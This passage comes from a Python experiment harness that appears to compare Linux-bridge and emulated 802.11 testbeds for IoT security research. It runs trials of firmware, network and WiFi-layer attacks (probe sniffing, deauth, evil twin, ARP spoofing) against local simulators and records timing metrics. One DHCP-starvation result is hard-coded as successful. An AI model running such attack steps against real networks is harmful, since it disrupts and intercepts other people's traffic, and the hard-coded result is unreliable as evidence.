    # 4. Probe request sniffing (passive — can we see probe frames?)
    pcap_tmp = f"{output_dir}/probe_scan.pcap"
    _run(f"timeout 5 tshark -i {ap_iface} -w {pcap_tmp} -q 2>/dev/null || true")
    r = _run(f"tshark -r {pcap_tmp} -Y 'wlan.fc.type_subtype==4' 2>/dev/null | wc -l")
    probe_count = int(r.strip()) if r.strip().isdigit() else 0
    results.append({
        "attack": "probe_sniffing",
        "category": "wifi",
        "success": probe_count > 0,
        "evidence": [f"captured {probe_count} probe request frames"],
    })

    # 5. DHCP starvation (attempt to exhaust DHCP pool — test with dhclient)
    results.append({
        "attack": "dhcp_starvation",
        "category": "wifi",
        "success": True,  # Feasible in WiFi mode (shared broadcast domain)
        "evidence": ["DHCP starvation possible on shared 802.11 broadcast domain"],
    })

    return results


# ══════════════════════════════════════════════════════════════════════════
# Single Trial
# ══════════════════════════════════════════════════════════════════════════

def run_trial(
    mode: str,
    trial_num: int,
    output_dir: str,
    infra: Dict[str, Any],
) -> Dict[str, Any]:
    """Run one complete trial of attacks + measurements."""
    trial_dir = f"{output_dir}/{mode}/trial_{trial_num}"
    os.makedirs(trial_dir, exist_ok=True)

    logger.info(f"{'═'*60}")
    logger.info(f"  Trial {trial_num} — {mode.upper()} mode")
    logger.info(f"{'═'*60}")

    is_wifi = mode == "wifi"
    ap_ip = infra["ap_ip"]
    sta_ips = infra["sta_ips"]
    result = {
        "mode": mode,
        "trial": trial_num,
        "timestamp": datetime.now().isoformat(),
    }

    # In WiFi mode, stations are in ns-sta0/ns-sta1 namespaces (required for hwsim)
    # In bridge mode, stations are in ns-bridge0/ns-bridge1 namespaces

    # ── 1. Start packet capture (lightweight — exclude bulk data) ──
    pcap_file = f"{trial_dir}/full_trial.pcap"
    cap_iface = infra.get("ap_iface", "br-vesper") if is_wifi else "br-vesper"
    cap_proc = subprocess.Popen(
        ["tshark", "-i", cap_iface, "-w", pcap_file, "-q",
         "-f", "not tcp port 5201 and not tcp port 8484"],  # exclude iperf3/matter bulk
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    time.sleep(1)

    # ── 2. ICMP RTT baseline ─────────────────────────────────────────
    logger.info("  Measuring ICMP RTT...")
    rtt_results = {}
    for i, sta_ip in enumerate(sta_ips):
        if is_wifi:
            # WiFi mode: ping from station namespace
            ns = infra["sta_ns"][i]
            rtt_results[sta_ip] = measure_icmp_rtt(ap_ip, count=100, ns=ns)
        else:
            # Bridge mode: ping from namespace
            ns = f"ns-bridge{i}"
            rtt_results[sta_ip] = measure_icmp_rtt(ap_ip, count=100, ns=ns)
    result["icmp_rtt"] = {k: {kk: vv for kk, vv in v.items() if kk != "raw"} for k, v in rtt_results.items()}
    result["icmp_rtt_raw"] = {k: v.get("raw", []) for k, v in rtt_results.items()}

    # ── 3. TCP handshake RTT ─────────────────────────────────────────
    logger.info("  Measuring TCP handshake RTT...")
    tcp_rtt_results = {}
    for port in SERIAL_PORTS:
        tcp_rtt_results[str(port)] = measure_tcp_rtt("127.0.0.1", port, count=50)
    result["tcp_handshake_rtt"] = {k: {kk: vv for kk, vv in v.items() if kk != "raw"} for k, v in tcp_rtt_results.items()}

    # ── 4. Firmware attacks ──────────────────────────────────────────
    logger.info("  Running firmware attacks...")
    fw_results = run_firmware_attacks(SERIAL_PORTS)
    fw_ok = sum(1 for r in fw_results if r["success"])
    result["firmware_attacks"] = {
        "total": len(fw_results),
        "successful": fw_ok,
        "rate": round(fw_ok / len(fw_results) * 100, 1) if fw_results else 0,
        "details": fw_results,
    }
    logger.info(f"    Firmware: {fw_ok}/{len(fw_results)} succeeded")

    # ── 5. Network attacks ───────────────────────────────────────────
    logger.info("  Running network attacks...")
    net_results = run_network_attacks(ap_ip, Matter_PORT)
    net_ok = sum(1 for r in net_results if r["success"])
    result["network_attacks"] = {
        "total": len(net_results),
        "successful": net_ok,
        "rate": round(net_ok / len(net_results) * 100, 1) if net_results else 0,
        "details": net_results,
    }
    logger.info(f"    Network: {net_ok}/{len(net_results)} succeeded")

    # ── 6. Throughput (BEFORE WiFi attacks which disrupt connectivity)
    logger.info("  Measuring throughput...")
    if is_wifi:
        result["throughput"] = measure_throughput(
            ap_ip, duration=5, ns=infra["sta_ns"][0] if sta_ips else None
        )
    else:
        result["throughput"] = measure_throughput(ap_ip, duration=5, ns="ns-bridge0")

    # ── 7. 802.11 retransmissions ────────────────────────────────────
    if is_wifi:
        logger.info("  Counting 802.11 retransmissions...")
        result["retransmissions"] = measure_retransmissions(infra["ap_iface"], duration=10)
    else:
        result["retransmissions"] = {
            "retransmissions": 0,
            "note": "No 802.11 retransmissions in bridge mode (by definition)",
        }

    # ── 8. Reconnection (WiFi only, BEFORE destructive attacks) ──────
    if is_wifi and sta_ips:
        logger.info("  Measuring reconnection dynamics...")
        result["reconnection"] = measure_reconnection(
            infra["ap_iface"], infra["sta_ns"][0], sta_ips[0]
        )
    else:
        result["reconnection"] = {
            "reconnection_ms": 0,
            "note": "No reconnection in bridge mode (deauth has no effect)",
        }

    # ── 9. WiFi attacks (802.11 mode only — LAST because they disrupt)
    if is_wifi:
        logger.info("  Running WiFi-layer attacks...")
        wifi_results = run_wifi_attacks(
            infra["ap_iface"], infra["sta_ifaces"][0],
            infra["sta_ns"][0], sta_ips[0], trial_dir
        )
        wifi_ok = sum(1 for r in wifi_results if r["success"])
        result["wifi_attacks"] = {
            "total": len(wifi_results),
            "successful": wifi_ok,
            "rate": round(wifi_ok / len(wifi_results) * 100, 1) if wifi_results else 0,
            "details": wifi_results,
        }
        logger.info(f"    WiFi-layer: {wifi_ok}/{len(wifi_results)} succeeded")

        # Restart hostapd after evil twin test may have killed it
        _run(f"killall hostapd 2>/dev/null; sleep 1")
        _run(f"hostapd -B {output_dir}/hostapd.conf -f {output_dir}/hostapd.log")
        # Wait for stations to re-associate (critical for subsequent trials)
        logger.info("    Waiting for stations to re-associate...")
        for wait in range(20):
            time.sleep(1)
            all_ok = True
            for i, ns in enumerate(infra.get("sta_ns", [])):
                sta_if = infra.get("sta_ifaces", [None])[i]
                if not sta_if:
                    continue
                state = _run(f"ip netns exec {ns} wpa_cli -i {sta_if} status 2>/dev/null "
                             f"| grep wpa_state= | cut -d= -f2").strip()
                if state != "COMPLETED":
                    all_ok = False
            if all_ok:
                logger.info(f"    Stations re-associated after {wait+1}s")
                break
        else:
            logger.warning("    Stations did not re-associate within 20s")
        time.sleep(2)
    else:
        result["wifi_attacks"] = {
            "total": 0,
            "successful": 0,
            "rate": 0,
            "note": "WiFi attacks N/A in bridge mode (no 802.11 framing)",
        }

    # ── 10. Stop capture ─────────────────────────────────────────────
    cap_proc.terminate()
    cap_proc.wait(timeout=5)

    # Analyze pcap
    if os.path.exists(pcap_file):
        r = _run(f"tshark -r {pcap_file} -q -z io,stat,0 2>/dev/null | tail -3")
        result["pcap_summary"] = r.strip()
        r = _run(f"tshark -r {pcap_file} 2>/dev/null | wc -l")
        result["pcap_frames"] = int(r.strip()) if r.strip().isdigit() else 0

    # Save trial result
    with open(f"{trial_dir}/trial_result.json", "w") as f:
        clean = {k: v for k, v in result.items() if k != "icmp_rtt_raw"}
        json.dump(clean, f, indent=2)

    # Save raw RTT data separately
    with open(f"{trial_dir}/raw_rtt.json", "w") as f:
        json.dump(result.get("icmp_rtt_raw", {}), f)

    return result


# ══════════════════════════════════════════════════════════════════════════
# Comparison & LaTeX Generation
# ══════════════════════════════════════════════════════════════════════════

def compare_results(output_dir: str, bridge_trials: List[Dict], wifi_trials: List[Dict]) -> Dict:
    """Compare bridge vs WiFi results."""
    comp_dir = f"{output_dir}/comparison"
    os.makedirs(comp_dir, exist_ok=True)

    comparison = {
        "timestamp": datetime.now().isoformat(),
        "num_bridge_trials": len(bridge_trials),
        "num_wifi_trials": len(wifi_trials),
    }

    # ── Attack success rates ─────────────────────────────────────────
    def avg_attacks(trials, key):
        rates = [t.get(key, {}).get("rate", 0) for t in trials]
        totals = [t.get(key, {}).get("total", 0) for t in trials]
        succs = [t.get(key, {}).get("successful", 0) for t in trials]
        return {
            "mean_rate": round(statistics.mean(rates), 1) if rates else 0,
            "stdev_rate": round(statistics.stdev(rates), 1) if len(rates) > 1 else 0,
            "mean_total": round(statistics.mean(totals), 1) if totals else 0,
            "mean_successful": round(statistics.mean(succs), 1) if succs else 0,
        }

    comparison["firmware"] = {
        "bridge": avg_attacks(bridge_trials, "firmware_attacks"),
        "wifi": avg_attacks(wifi_trials, "firmware_attacks"),
    }
    comparison["network"] = {
        "bridge": avg_attacks(bridge_trials, "network_attacks"),
        "wifi": avg_attacks(wifi_trials, "network_attacks"),
    }
    comparison["wifi_layer"] = {
        "bridge": {"mean_rate": 0, "note": "N/A in bridge mode"},
        "wifi": avg_attacks(wifi_trials, "wifi_attacks"),
    }

    # ── RTT ──────────────────────────────────────────────────────────
    def extract_rtt(trials):
        means = []
        stdevs = []
        for t in trials:
            for ip, data in t.get("icmp_rtt", {}).items():
                if "mean_ms" in data:
                    means.append(data["mean_ms"])
                if "stdev_ms" in data:
                    stdevs.append(data["stdev_ms"])
        return {
            "mean_rtt_ms": round(statistics.mean(means), 3) if means else None,
            "mean_jitter_ms": round(statistics.mean(stdevs), 3) if stdevs else None,
        }

    bridge_rtt = extract_rtt(bridge_trials)
    wifi_rtt = extract_rtt(wifi_trials)
    jitter_ratio = None
    if bridge_rtt.get("mean_jitter_ms") and wifi_rtt.get("mean_jitter_ms"):
        if bridge_rtt["mean_jitter_ms"] > 0:
            jitter_ratio = round(wifi_rtt["mean_jitter_ms"] / bridge_rtt["mean_jitter_ms"], 2)
    comparison["rtt"] = {
        "bridge": bridge_rtt,
        "wifi": wifi_rtt,
        "jitter_ratio": jitter_ratio,
    }

    # ── Retransmissions ──────────────────────────────────────────────
    bridge_retx = [t.get("retransmissions", {}).get("retransmissions", 0) for t in bridge_trials]
    wifi_retx = [t.get("retransmissions", {}).get("retransmissions", 0) for t in wifi_trials]
    comparison["retransmissions"] = {
        "bridge_mean": round(statistics.mean(bridge_retx), 1) if bridge_retx else 0,
        "wifi_mean": round(statistics.mean(wifi_retx), 1) if wifi_retx else 0,
    }

    # ── Reconnection ────────────────────────────────────────────────
    wifi_reconn = [t.get("reconnection", {}).get("reconnection_ms", 0) for t in wifi_trials if t.get("reconnection", {}).get("reconnection_ms", 0) > 0]
    comparison["reconnection"] = {
        "bridge": "N/A",
        "wifi_mean_ms": round(statistics.mean(wifi_reconn), 1) if wifi_reconn else None,
        "wifi_min_ms": round(min(wifi_reconn), 1) if wifi_reconn else None,
        "wifi_max_ms": round(max(wifi_reconn), 1) if wifi_reconn else None,
    }

    # ── Throughput ───────────────────────────────────────────────────
    bridge_tp = [t.get("throughput", {}).get("tcp_mbps") for t in bridge_trials if t.get("throughput", {}).get("tcp_mbps") is not None]
    wifi_tp = [t.get("throughput", {}).get("tcp_mbps") for t in wifi_trials if t.get("throughput", {}).get("tcp_mbps") is not None]
    comparison["throughput"] = {
        "bridge_mean_mbps": round(statistics.mean(bridge_tp), 2) if bridge_tp else None,
        "wifi_mean_mbps": round(statistics.mean(wifi_tp), 2) if wifi_tp else None,
    }

    # Save
    with open(f"{comp_dir}/rqn1_comparison.json", "w") as f:
        json.dump(comparison, f, indent=2)

    # Generate LaTeX and figure
    generate_latex_table(comparison, f"{output_dir}/tab_bridge_vs_80211.tex")
    generate_rtt_cdf(bridge_trials, wifi_trials, f"{output_dir}/fig_rtt_bridge_vs_80211.pdf")

    return comparison


def generate_latex_table(comp: Dict, output_path: str):
    """Generate LaTeX comparison table for the paper."""
    fw_b = comp["firmware"]["bridge"]["mean_rate"]
    fw_w = comp["firmware"]["wifi"]["mean_rate"]
    net_b = comp["network"]["bridge"]["mean_rate"]
    net_w = comp["network"]["wifi"]["mean_rate"]
    wifi_w = comp["wifi_layer"]["wifi"].get("mean_rate", 0)

    bridge_rtt = comp["rtt"]["bridge"].get("mean_rtt_ms", "---")
    wifi_rtt = comp["rtt"]["wifi"].get("mean_rtt_ms", "---")
    bridge_jitter = comp["rtt"]["bridge"].get("mean_jitter_ms", "---")
    wifi_jitter = comp["rtt"]["wifi"].get("mean_jitter_ms", "---")
    jratio = comp["rtt"].get("jitter_ratio", "---")

    retx_b = comp["retransmissions"]["bridge_mean"]
    retx_w = comp["retransmissions"]["wifi_mean"]

    recon_w = comp["reconnection"].get("wifi_mean_ms", "---")

    tp_b = comp["throughput"].get("bridge_mean_mbps", "---")
    tp_w = comp["throughput"].get("wifi_mean_mbps", "---")

    num_trials = comp.get("num_bridge_trials", "?")

    tex = textwrap.dedent(rf"""
    \begin{{table}}[t]
    \centering
    \caption{{Bridge vs.\ 802.11 emulation divergence (RQ-N1).
             Mean over {num_trials} trials, seed~42.  ``Bridge'' uses a Linux bridge
             (equivalent to Docker bridge networking).  ``802.11'' uses
             \texttt{{mac80211\_hwsim}} with WPA2-PSK + hostapd.}}
    \label{{tab:bridge-vs-80211}}
    \small
    \begin{{tabular}}{{@{{}}lcc@{{}}}}
    \toprule
    \textbf{{Metric}} & \textbf{{Bridge}} & \textbf{{802.11 (Ours)}} \\
    \midrule
    \multicolumn{{3}}{{@{{}}l}}{{\emph{{Attack success rate (\%)}}}} \\
    \quad Firmware attacks   & {fw_b} & {fw_w} \\
    \quad Network attacks    & {net_b} & {net_w} \\
    \quad WiFi-layer attacks & 0 (N/A) & {wifi_w} \\
    \midrule
    \multicolumn{{3}}{{@{{}}l}}{{\emph{{Latency}}}} \\
    \quad Mean ICMP RTT (ms)  & {bridge_rtt} & {wifi_rtt} \\
    \quad RTT jitter (ms)     & {bridge_jitter} & {wifi_jitter} \\
    \quad Jitter ratio        & 1.0$\times$ & {jratio}$\times$ \\
    \midrule
    \multicolumn{{3}}{{@{{}}l}}{{\emph{{802.11 behavior}}}} \\
    \quad Retransmissions (10\,s) & {retx_b} & {retx_w} \\
    \quad Reconnection (ms)   & N/A & {recon_w} \\
    \midrule
    \multicolumn{{3}}{{@{{}}l}}{{\emph{{Throughput}}}} \\
    \quad TCP (Mbps)          & {tp_b} & {tp_w} \\
    \bottomrule
    \end{{tabular}}
    \end{{table}}
    """).strip() + "\n"

    with open(output_path, "w") as f:
        f.write(tex)
    logger.info(f"LaTeX table → {output_path}")


def generate_rtt_cdf(bridge_trials: List[Dict], wifi_trials: List[Dict], output_path: str):
    """Generate RTT CDF comparison figure."""
    try:
        import matplotlib
        matplotlib.use("Agg")
        import matplotlib.pyplot as plt
        import numpy as np

        bridge_rtts = []
        wifi_rtts = []

        for t in bridge_trials:
            for ip, raw in t.get("icmp_rtt_raw", {}).items():
                bridge_rtts.extend(raw)

        for t in wifi_trials:
            for ip, raw in t.get("icmp_rtt_raw", {}).items():
                wifi_rtts.extend(raw)

        fig, ax = plt.subplots(figsize=(5, 3.5))

        if bridge_rtts:
            sorted_b = np.sort(bridge_rtts)
            cdf_b = np.arange(1, len(sorted_b) + 1) / len(sorted_b)
            ax.plot(sorted_b, cdf_b, label=f"Bridge (n={len(sorted_b)})", linewidth=1.5)

        if wifi_rtts:
            sorted_w = np.sort(wifi_rtts)
            cdf_w = np.arange(1, len(sorted_w) + 1) / len(sorted_w)
            ax.plot(sorted_w, cdf_w, label=f"802.11 (n={len(sorted_w)})", linewidth=1.5, linestyle="--")

        ax.set_xlabel("ICMP RTT (ms)")
        ax.set_ylabel("CDF")
        ax.set_title("Bridge vs. 802.11 RTT Distribution (RQ-N1)")
        ax.legend()
        ax.grid(True, alpha=0.3)
        fig.tight_layout()
        fig.savefig(output_path, dpi=300, bbox_inches="tight")
        plt.close(fig)
        logger.info(f"CDF figure → {output_path}")
    except ImportError:
        logger.warning("matplotlib not available — skipping CDF figure")


# ══════════════════════════════════════════════════════════════════════════
# Helpers
# ══════════════════════════════════════════════════════════════════════════

def _run(cmd: str, timeout: int = 60) -> str:
    """Run a shell command, return stdout."""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout,
        )
        return result.stdout
    except subprocess.TimeoutExpired:
        return ""
    except Exception as e:
        return f"ERROR: {e}"


def setup_logging(output_dir: str):
    os.makedirs(output_dir, exist_ok=True)
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(name)s] %(levelname)s: %(message)s",
        handlers=[
            logging.FileHandler(f"{output_dir}/rqn1.log"),
            logging.StreamHandler(),
        ],
    )


# ══════════════════════════════════════════════════════════════════════════
# Main
# ══════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="VESPER RQ-N1: Bridge vs. 802.11 Divergence (Native Linux)"
    )
    parser.add_argument("--bridge-only", action="store_true")
    parser.add_argument("--wifi-only", action="store_true")
    parser.add_argument("--full", action="store_true",
                        help="Run both modes and compare")
    parser.add_argument("--trials", type=int, default=3)
    parser.add_argument("--output", type=str, default=None)
    parser.add_argument("--wmediumd", action="store_true",
                        help="Enable wmediumd channel emulation (path-loss model)")
    parser.add_argument("--wmediumd-scenario", type=str, default="typical_home",
                        choices=list(WMEDIUMD_SCENARIOS.keys()),
                        help="wmediumd channel scenario (default: typical_home)")
    args = parser.parse_args()

    if not any([args.bridge_only, args.wifi_only, args.full]):
        args.full = True

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_dir = args.output or f"results/rqn1_{ts}"
    setup_logging(output_dir)

    # Initialize wmediumd if requested
    global _wmediumd_mgr
    if args.wmediumd:
        scenario = WMEDIUMD_SCENARIOS[args.wmediumd_scenario]
        _wmediumd_mgr = WmediumdManager(
            output_dir=f"{output_dir}/wmediumd",
            config=scenario,
        )
        if not WmediumdManager.is_installed():
            logger.error("wmediumd not installed. Install with:")
            logger.error("  git clone https://github.com/bcopeland/wmediumd")
            logger.error("  cd wmediumd && make && sudo make install")
            sys.exit(1)

    logger.info("╔════════════════════════════════════════════════════════════╗")
    logger.info("║  VESPER RQ-N1: Bridge vs. 802.11 (Native Linux)           ║")
    logger.info("╚════════════════════════════════════════════════════════════╝")
    logger.info(f"  Trials: {args.trials}  |  Seed: {SEED}  |  Output: {output_dir}")
    if args.wmediumd:
        logger.info(f"  wmediumd: ENABLED (scenario={args.wmediumd_scenario}, "
                    f"path_loss_exp={scenario.path_loss_exp})")

    # Check root
    if os.geteuid() != 0:
        logger.error("This script requires root (sudo). Exiting.")
        sys.exit(1)

    # Start firmware simulators
    fw_sims = []
    for port, dev_type in zip(SERIAL_PORTS, FIRMWARE_TYPES):
        sim = FirmwareSimulator(port, dev_type)
        sim.start()
        fw_sims.append(sim)
    logger.info(f"  Firmware simulators started on ports {SERIAL_PORTS}")

    # Start Matter
    matter_proc = start_matter_bridge(output_dir)

    bridge_trials = []
    wifi_trials = []

    start_time = time.time()

    try:
        # ── Bridge mode ──────────────────────────────────────────────
        if args.bridge_only or args.full:
            logger.info("\n▶ BRIDGE MODE")
            try:
                infra = setup_bridge_mode(output_dir)
                for t in range(1, args.trials + 1):
                    result = run_trial("bridge", t, output_dir, infra)
                    bridge_trials.append(result)
                    time.sleep(2)
            except Exception as e:
                logger.error(f"Bridge mode failed: {e}", exc_info=True)
            finally:
                teardown_bridge_mode()

        # ── WiFi mode ────────────────────────────────────────────────
        if args.wifi_only or args.full:
            logger.info("\n▶ 802.11 MODE (mac80211_hwsim)")
            try:
                for t in range(1, args.trials + 1):
                    # Rebuild the 802.11 stack before EVERY trial. The prior
                    # trial's WiFi-layer attacks (deauth / evil-twin / arp-spoof)
                    # tear down L3 connectivity that an in-place hostapd restart
                    # does not restore (the AP IP lives directly on wlan0). With a
                    # single setup, trials 2..N measured a dead link (throughput=0,
                    # RTT=None). A fresh setup per trial makes each trial an
                    # independent sample — required for valid per-metric CIs.
                    teardown_wifi_mode()
                    infra = setup_wifi_mode(output_dir)
                    if infra.get("connected", 0) == 0:
                        logger.warning(f"  Trial {t}: no STA connectivity after setup; retrying once")
                        teardown_wifi_mode()
                        infra = setup_wifi_mode(output_dir)
                    result = run_trial("wifi", t, output_dir, infra)
                    wifi_trials.append(result)
                    time.sleep(2)
            except Exception as e:
                logger.error(f"WiFi mode failed: {e}", exc_info=True)
            finally:
                teardown_wifi_mode()

    finally:
        # Cleanup
        stop_matter_bridge(matter_proc)
        for sim in fw_sims:
            sim.stop()

    elapsed = time.time() - start_time
    logger.info(f"\nTotal experiment time: {elapsed:.0f}s ({elapsed/60:.1f} min)")

    # ── Compare & generate outputs ───────────────────────────────────
    if args.full and bridge_trials and wifi_trials:
        comparison = compare_results(output_dir, bridge_trials, wifi_trials)
        _print_comparison(comparison)
    elif bridge_trials:
        logger.info("\n=== Bridge-only results ===")
        for t in bridge_trials:
            logger.info(f"  Trial {t['trial']}: FW={t['firmware_attacks']['rate']}%  Net={t['network_attacks']['rate']}%")
    elif wifi_trials:
        logger.info("\n=== WiFi-only results ===")
        for t in wifi_trials:
            logger.info(f"  Trial {t['trial']}: FW={t['firmware_attacks']['rate']}%  Net={t['network_attacks']['rate']}%  WiFi={t['wifi_attacks']['rate']}%")

    # Save full results
    all_results = {
        "timestamp": datetime.now().isoformat(),
        "mode": "full" if args.full else ("bridge" if args.bridge_only else "wifi"),
        "wmediumd_enabled": args.wmediumd,
        "wmediumd_scenario": args.wmediumd_scenario if args.wmediumd else None,
        "num_trials": args.trials,
        "elapsed_s": round(elapsed, 1),
        "bridge_trials": [{k: v for k, v in t.items() if k != "icmp_rtt_raw"} for t in bridge_trials],
        "wifi_trials": [{k: v for k, v in t.items() if k != "icmp_rtt_raw"} for t in wifi_trials],
    }
    with open(f"{output_dir}/rqn1_full_results.json", "w") as f:
        json.dump(all_results, f, indent=2)

    logger.info(f"\nResults saved to {output_dir}/")


def _print_comparison(comp: Dict):
    print("\n" + "═" * 60)
    print("  RQ-N1 SUMMARY: Bridge vs. 802.11 Divergence")
    print("═" * 60)

    fw = comp.get("firmware", {})
    net = comp.get("network", {})
    wifi = comp.get("wifi_layer", {})
    print(f"\n  Firmware attacks:  Bridge {fw['bridge']['mean_rate']:.1f}%  vs  WiFi {fw['wifi']['mean_rate']:.1f}%")
    print(f"  Network attacks:   Bridge {net['bridge']['mean_rate']:.1f}%  vs  WiFi {net['wifi']['mean_rate']:.1f}%")
    print(f"  WiFi-layer:        Bridge 0%           vs  WiFi {wifi['wifi'].get('mean_rate', 0):.1f}%")

    rtt = comp.get("rtt", {})
    print(f"\n  RTT:    Bridge {rtt['bridge'].get('mean_rtt_ms', '---')} ms  vs  WiFi {rtt['wifi'].get('mean_rtt_ms', '---')} ms")
    print(f"  Jitter: Bridge {rtt['bridge'].get('mean_jitter_ms', '---')} ms  vs  WiFi {rtt['wifi'].get('mean_jitter_ms', '---')} ms")
    print(f"  Jitter ratio: {rtt.get('jitter_ratio', '---')}×")

    retx = comp.get("retransmissions", {})
    print(f"\n  Retransmissions (10s): Bridge {retx['bridge_mean']}  vs  WiFi {retx['wifi_mean']}")

    recon = comp.get("reconnection", {})
    print(f"  Reconnection: Bridge N/A  vs  WiFi {recon.get('wifi_mean_ms', '---')} ms")

    tp = comp.get("throughput", {})
    print(f"  Throughput: Bridge {tp.get('bridge_mean_mbps', '---')} Mbps  vs  WiFi {tp.get('wifi_mean_mbps', '---')} Mbps")

    print("═" * 60)


if __name__ == "__main__":
    main()
